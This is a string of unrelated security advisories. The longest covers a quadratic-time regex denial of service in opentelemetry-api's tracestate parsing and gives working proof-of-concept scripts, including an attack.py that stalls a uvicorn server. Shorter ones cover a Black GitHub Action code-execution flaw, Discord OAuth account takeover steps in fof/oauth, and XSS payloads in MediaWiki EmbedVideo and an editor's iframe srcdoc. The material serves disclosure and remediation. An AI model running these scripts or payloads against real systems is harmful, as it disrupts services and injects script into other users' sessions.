Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.

## Proof of concept

### A. Show the quadratic cost (no server needed)

1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected).
2. Save as `poc_tracestate.py`:
```python
import logging
import time

from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator

# The library logs the whole malformed member at WARNING; silence it so the timings stay readable.
logging.disable(logging.CRITICAL)

TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"
propagator = TraceContextTextMapPropagator()

previous = None
for n in (10_000, 20_000, 40_000, 80_000):
    # N spaces after a valid member, no comma anywhere in the header
    carrier = {"traceparent": TRACEPARENT, "tracestate": "a=b" + " " * n + "x"}
    start = time.perf_counter()
    propagator.extract(carrier)
    elapsed = time.perf_counter() - start
    growth = f"x{elapsed / previous:.1f}" if previous else "-"
    print(f"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}")
    previous = elapsed
```
3. Run `python poc_tracestate.py`.
4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run:
```
  10000 characters    0.06 s  growth when size doubles: -
  20000 characters    0.26 s  growth when size doubles: x4.0
  40000 characters    1.04 s  growth when size doubles: x4.0
  80000 characters    4.13 s  growth when size doubles: x4.0
```
Replace `" "` with `"\t"` to see ≈1.6× longer.

### B. Show that one request stalls a real server
This uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).

1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi "uvicorn[standard]"`.
2. Save as `app.py`:
```python
from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware

async def app(scope, receive, send):
    await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain")]})
    await send({"type": "http.response.body", "body": b"ok"})

app = OpenTelemetryMiddleware(app)
```
3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools`
4. Save as `attack.py`:
```python
"""Send one oversized tracestate request and, while it is being handled,
measure how long an unrelated request to the same server has to wait."""
import socket
import sys
import threading
import time

HOST, PORT = "127.0.0.1", 8000
N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000
TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"

def get(path, extra=""):
    s = socket.create_connection((HOST, PORT), timeout=120)
    s.sendall(f"GET {path} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n{extra}\r\n".encode())
    start, data = time.perf_counter(), b""
    while chunk := s.recv(65536):
        data += chunk
    return time.perf_counter() - start, data.split(b"\r\n")[0].decode()

result = {}
extra = f"traceparent: {TRACEPARENT}\r\ntracestate: a=b{' ' * N}x\r\n"
attacker = threading.Thread(target=lambda: result.update(a=get("/attack", extra)))
print("idle /ping:               %.3f s  %s" % get("/ping"))
attacker.start()
time.sleep(0.5)  # let the attack request reach the server first
print("/ping during the attack:  %.3f s  %s" % get("/ping"))
attacker.join()
print("attack request itself:    %.3f s  %s" % result["a"])
```
5. In a second terminal run `python attack.py 100000`.
6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run:
```
idle /ping:               0.000 s  HTTP/1.1 200 OK
/ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked)
attack request itself:    6.408 s  HTTP/1.1 200 OK
```
7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.

## Severity
**Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.

**Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.

**Severity: Medium.**

## Suggested remediation
Replace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input:
```diff
a/opentelemetry-api/src/opentelemetry/trace/span.py
+++ b/opentelemetry-api/src/opentelemetry/trace/span.py
@@ def from_header(cls, header_list: list[str]) -> TraceState:
         for header in header_list:
-            members: list[str] = re.split(_delimiter_pattern, header)
+            members: list[str] = [m.strip(" \t") for m in header.split(",")]
```
`_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.

## Credit

Discovered and reported by SecDim Security Research
secdim.com | @secdim | security@secdim.com

**FROM MAINTAINERS**

## Summary

`TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.

Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.

## Impact

Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.

The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.

Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.

The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.

## Patches

Versions of `opentelemetry-api` up to and including `1.45.0` are affected.

Upgrade `opentelemetry-api` to version `1.45.1` or later.

Version `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.

## Workarounds

Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.

### Summary

The GitHub Action bundled with Black can read the version from `tool.black.required-version` if `use_pyproject` is set to True. This version is not validated and therefore can be used to execute untrusted code in the context of a victim's repository.

### Details

This is similar to the previous CVE-2026-31900. The value in `tool.black.required-version` is accepted as the version to be installed by the action without validation.

### Proof of concept

Reproduction requires a victim to use Black's GitHub Action with `use_pyproject: true`. The attacker would then issue a PR to the victim's repository with `pyproject.toml` edited so that Black points to a malicious repository.

### Impact

This is a remote code execution vulnerability impacting users using the GitHub Action bundled with psf/black and using the `use_pyproject: true` setting.

cves.summary: BSD pppd allows local users to change the permissions of arbitrary files via a symlink attack on a file that is specified as a tty device.

### Impact

An unauthenticated account takeover vulnerability exists in `fof/oauth` when the Discord OAuth provider is enabled.

Discord allows an account to use an unverified email address when its phone number has been verified. During OAuth authentication, Discord may return that email address with `"verified": false`.

Affected versions of `fof/oauth` did not validate this flag and passed the email address to Flarum core as trusted via `provideTrustedEmail()`. Flarum core could then match the trusted email address to an existing user, link the attacker-controlled Discord identity to that user, and authenticate the attacker as the victim.

An attacker who knows a user's email address can therefore take over the corresponding Flarum account without knowing its password or requiring any interaction from the victim. This includes administrator accounts.

#### Preconditions for exploitation

1. Discord sign-in is enabled on the forum.
2. The victim has a Flarum account with a known email address.
3. The victim's email address is not already associated with a Discord account.
4. The attacker creates or configures a Discord account using the victim's email address without verifying it and verifies a phone number instead.
5. The attacker authenticates to the forum using that Discord account.

The issue is specific to Discord's ability to return an unverified email address through OAuth. Other bundled providers were not confirmed to be practically exploitable through the same method because they only return verified or confirmed email addresses in the relevant authentication flow.

### Patched Versions

- [1.7.4](https://github.com/FriendsOfFlarum/oauth/releases/tag/1.7.4)
- [2.0.0-beta.4](https://github.com/FriendsOfFlarum/oauth/releases/tag/2.0.0-beta.4)

### Workarounds

Administrators who cannot update immediately should disable the Discord OAuth provider in the extension settings.

### Credits

Reported by @faran1512

### Summary
With $wgEmbedVideoRequireConsent disabled (not the default), the urls for videos are passed into an iframe src attribute without sanitization. When given a malformed url or id, the src attribute can be escaped via double quotes, allowing for html/javascript injection.

### Details
The iframe assembled [here](https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/blob/a573a16d925ee0ea0d34b360856dc8ab0b88f822/includes/EmbedService/EmbedHtmlFormatter.php#L204-L208) adds the url from `getUrl()` as the src without sanitization.
The id regex for the archiveorg service and the url regexes for the wistia and sharepoint services allow for double quotes to be introduced.

### PoC
Using double quotes, the src attribute can be escaped.
```
<embedvideo service="archiveorg" id='a" onmouseover="alert(document.domain)" data-x="'></embedvideo>
```

### Impact
When $wgEmbedVideoRequireConsent = false, any user able to edit a page can inject arbitrary JavaScript into an HTML event handler attribute (e.g. onfocus) via parameter. It requires no interaction (autofires via autofocus) and executes in the wiki origin for every visitor to the page.

cves.summary:
### Impact
A Stored Cross-Site Scripting (XSS) vulnerability exists in the rich text editor due to improper sanitization of the srcdoc attribute on <iframe> elements.

While the underlying Symfony HtmlSanitizer correctly HTML-encodes special characters inside the attribute value (e.g., converting <script> to <script>), the HTML specification mandates that browsers automatically decode HTML entities inside attribute values before processing them. As a result, any encoded JavaScript inside a srcdoc attribute is evaluated and executed as live HTML/JS in the context of the iframe when the page is rendered.

An attacker with permissions to edit an Editor field can inject malicious scripts to target other users viewing the content. Potential impacts include:

- Session Hijacking (stealing admin session cookies via document.cookie)
- Account Takeover & Privilege Escalation (e.g., a low-privileged editor triggering actions as an Administrator)
- Admin panel data theft

### Patches
The vulnerability has been patched in version v9.22.5.

The fix explicitly removes srcdoc from the list of allowed iframe attributes in `src/Utils/Sanitization/FormatsSanitizedValue.php`.

### Workarounds
Users who cannot upgrade immediately can manually sanitize all content of editor fields to strip `srcdoc` attributes.
